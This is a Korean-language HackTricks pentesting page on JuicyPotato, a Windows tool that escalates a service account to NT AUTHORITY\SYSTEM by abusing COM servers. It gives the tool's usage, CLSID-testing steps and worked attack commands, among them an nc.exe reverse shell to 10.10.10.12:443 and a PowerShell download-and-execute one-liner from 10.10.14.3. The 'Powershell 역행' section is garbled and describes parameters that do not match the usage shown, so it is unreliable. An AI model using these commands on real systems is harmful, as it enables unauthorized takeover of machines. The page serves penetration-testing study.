# JuicyPotato

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로부터 영웅이 될 때까지 AWS 해킹을 배워보세요</strong>!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 팁을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

{% hint style="warning" %}
**JuicyPotato는** Windows Server 2019 및 Windows 10 빌드 1809 이후에서는 작동하지 않습니다. 그러나 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)를 사용하여 **동일한 권한을 활용하고 `NT AUTHORITY\SYSTEM` 수준의 액세스를 얻을 수 있습니다**. _**확인:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (골든 권한 남용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

[_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)의 달콤한 버전으로, 즉 **Windows 서비스 계정에서 NT AUTHORITY\SYSTEM으로의 로컬 권한 상승 도구**입니다.

#### juicypotato를 다음에서 다운로드할 수 있습니다. [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### 요약 <a href="#summary" id="summary"></a>

**[juicy-potato Readme에서](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 및 [그 변형](https://github.com/decoder-it/lonelypotato)은 [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [서비스](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126)를 기반으로한 권한 상승 체인을 활용합니다. 이는 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한이 있는 경우에만 가능합니다. Windows 빌드 검토 중에 `BITS`가 의도적으로 비활성화되고 포트 `6666`이 사용 중인 설정을 발견했습니다.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)를 무기화하기로 결정했습니다: **Juicy Potato를 만나보세요**.

> 이론은 [Rotten Potato - Service Accounts에서 SYSTEM으로의 권한 상승](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)을 참조하고 링크 및 참조 사슬을 따르세요.

우리는 `BITS` 이외에도 여러 COM 서버를 남용할 수 있다는 것을 발견했습니다. 이들은 다음과 같은 조건을 충족해야 합니다:

1. 현재 사용자(일반적으로 "서비스 사용자"로서 위임 권한을 가진 사용자)에 의해 인스턴스화될 수 있어야 함
2. `IMarshal` 인터페이스를 구현해야 함
3. 상승된 사용자(SYSTEM, Administrator 등)로 실행되어야 함

일부 테스트를 거친 후에 우리는 여러 Windows 버전에서 [흥미로운 CLSID 목록](http://ohpe.it/juicy-potato/CLSID/)을 얻고 테스트했습니다.

### Juicy 세부 정보 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato를 사용하면 다음을 수행할 수 있습니다:

* **대상 CLSID** _원하는 CLSID를 선택하세요._ [_여기_](http://ohpe.it/juicy-potato/CLSID/) _에서 OS별로 정리된 목록을 찾을 수 있습니다._
* **COM 수신 포트** _하드코딩된 6666 대신 선호하는 COM 수신 포트를 정의하세요._
* **COM 수신 IP 주소** _서버를 원하는 IP에 바인딩하세요._
* **프로세스 생성 모드** _위임된 사용자의 권한에 따라 다음 중 하나를 선택할 수 있습니다:_
* `CreateProcessWithToken` (`SeImpersonate` 필요)
* `CreateProcessAsUser` (`SeAssignPrimaryToken` 필요)
* `both`
* **실행할 프로세스** _악용에 성공한 경우 실행할 실행 파일 또는 스크립트_
* **프로세스 인수** _실행 프로세스의 인수를 사용자 정의하세요._
* **RPC 서버 주소** _은밀한 접근을 위해 외부 RPC 서버에 인증할 수 있습니다._
* **RPC 서버 포트** _외부 서버에 인증하려는 경우 유용하며 방화벽이 포트 `135`를 차단하는 경우에 사용됩니다._
* **테스트 모드** _주로 테스트 목적으로 사용되며 DCOM을 생성하고 토큰의 사용자를 출력합니다. 테스트에 대한 자세한 내용은_ [_여기를 참조하세요_](http://ohpe.it/juicy-potato/Test/)

### 사용법 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 최종 결론 <a href="#final-thoughts" id="final-thoughts"></a>

**[juicy-potato Readme에서](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

만약 사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면, 당신은 **SYSTEM**입니다.

모든 이러한 COM 서버의 악용을 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체의 권한을 수정하는 것을 고려할 수 있지만, 힘들 것입니다.

실제 해결책은 `* SERVICE` 계정 아래에서 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 이 취약점을 방지할 수 있지만, 기본 운영 체제에 심각한 영향을 줄 수 있습니다.

출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 예시

참고: 시도할 CLSID 목록은 [이 페이지](https://ohpe.it/juicy-potato/CLSID/)를 방문하세요.

### nc.exe 역쉘 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell 역행

Powershell 역행은 Windows 시스템에서 로컬 권한 상승을 위한 기술입니다. 이 기술은 JuicyPotato라는 도구를 사용하여 실행됩니다. JuicyPotato는 COM 개체의 권한을 빈번하게 확인하는 Windows 기능을 이용하여 권한 상승을 수행합니다.

JuicyPotato를 사용하여 Powershell 역행을 수행하려면 다음 단계를 따르세요:

1. JuicyPotato를 다운로드하고 실행합니다.
2. JuicyPotato를 실행한 후, "CLSID" 매개변수를 사용하여 COM 개체의 CLSID를 지정합니다.
3. "Action" 매개변수를 사용하여 실행할 작업을 지정합니다. 예를 들어, "RunThis" 작업을 지정하면 실행할 파일의 경로를 지정해야 합니다.
4. "Argument" 매개변수를 사용하여 작업에 대한 추가 인수를 지정합니다.
5. "OutputFile" 매개변수를 사용하여 결과를 저장할 파일의 경로를 지정합니다.
6. JuicyPotato를 실행하여 Powershell 역행을 수행합니다.

Powershell 역행은 Windows 시스템에서 로컬 권한 상승을 위한 강력한 기술입니다. JuicyPotato를 사용하여 이 기술을 사용할 수 있으며, 이를 통해 시스템에서 더 높은 권한을 얻을 수 있습니다.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 새로운 CMD 창 열기 (RDP 액세스가 있는 경우)

![](<../../.gitbook/assets/image (37).png>)

## CLSID 문제

대부분의 경우, JuicyPotato가 사용하는 기본 CLSID는 **작동하지 않고** 공격이 실패합니다. 일반적으로 여러 번 시도해야 **작동하는 CLSID**를 찾을 수 있습니다. 특정 운영 체제에 대해 시도할 CLSID 목록을 얻으려면 다음 페이지를 방문해야 합니다:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs 확인하기**

먼저, juicypotato.exe 외에도 몇 가지 실행 파일이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)을 다운로드하여 PS 세션에 로드하고, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)을 다운로드하고 실행하세요. 이 스크립트는 테스트할 가능한 CLSID 목록을 생성합니다.

그런 다음 [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID 목록과 juicypotato 실행 파일 경로를 변경하세요)을 다운로드하고 실행하세요. 이 스크립트는 모든 CLSID를 시도하며, **포트 번호가 변경되면 CLSID가 작동한 것입니다**.

**-c** 매개변수를 사용하여 작동하는 CLSID를 **확인**하세요.

## 참고 자료
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 홍보**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **자신의 해킹 기법을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하세요.

</details>
